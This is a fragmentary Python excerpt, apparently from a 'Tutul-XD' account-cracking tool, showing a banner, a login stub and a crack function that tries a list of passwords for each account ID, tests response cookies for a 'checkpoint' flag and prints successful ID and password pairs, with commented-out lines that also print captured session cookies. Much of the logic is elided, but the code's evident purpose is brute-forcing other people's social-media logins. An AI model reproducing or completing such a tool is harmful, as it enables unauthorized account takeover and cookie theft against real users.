...
def login():
	banner()
	TUTULj('\033[10;97m[\033[10;92m+\033[10;97m]\033[1;97m============================================')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[{bo}Tutul-XD\033[10;97m]\033[1;90m>~{P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}-{P}[{h}Ok{P}-{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;95m[Tutul-Cp] {idf} | {pw}')
				linex()
				...
				#print(f'\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;92m[Tutul:Ok] {idf} | {pw}')
				#linex()
				ex = random.choice([m,k,h,b,u,x])
				print(f'\r\033[10;92m[Tutul-Ok💚] {idf} | {pw} \033[10;91m•> \033[10;92m{tutulx(idf)}')
				linex()
				...
				break
				#print(f'\r\033[10;92m[Tutul-Ok💚] {idf} | {pw} \033[10;91m:> \033[10;96m{tutulx(idf)}\n\033[10;93m[🌺] = COOKIES\033[10;91m : {ex}{kuki}')
			else:
				continue
